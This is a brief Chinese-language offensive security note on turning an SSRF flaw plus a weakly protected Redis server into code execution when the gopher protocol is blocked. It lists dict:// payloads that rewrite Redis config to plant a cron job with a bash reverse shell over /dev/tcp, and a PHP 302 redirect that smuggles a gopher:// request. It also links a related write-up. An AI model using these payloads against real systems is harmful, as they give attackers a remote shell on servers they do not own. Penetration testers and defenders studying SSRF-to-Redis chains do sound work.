## 有ssrf+redis弱口令，禁用gopher协议，怎么利用？

1、dict协议也可以操作数据

```
dict://127.0.0.1:6379/config:set:dir:/var/spool/cron
dict://127.0.0.1:6379/config:set:dbfilename:root
dict://127.0.0.1:6379/set:1:nn*/1 * * * * bash -i >& /dev/tcp/127.0.0.1/2333 0>&1nn
dict://127.0.0.1:6379/save
```

这是面向未授权的情况，如果存在口令，需要维持会话才可以执行命令。

但dict发完自带一个quit，并不能维持会话。

2、302跳转，利用http跳转换成gopher协议

```
header('Location: gopher://ip:6379/xxxx')
```

## Demo

[一次“SSRF-->RCE”的艰难利用](https://mp.weixin.qq.com/s?__biz=MzUyMDEyNTkwNA==&mid=2247483865&idx=1&sn=41e56040229e383a82a671fc359ee82b)

## 引导

bypass ssrf的方式。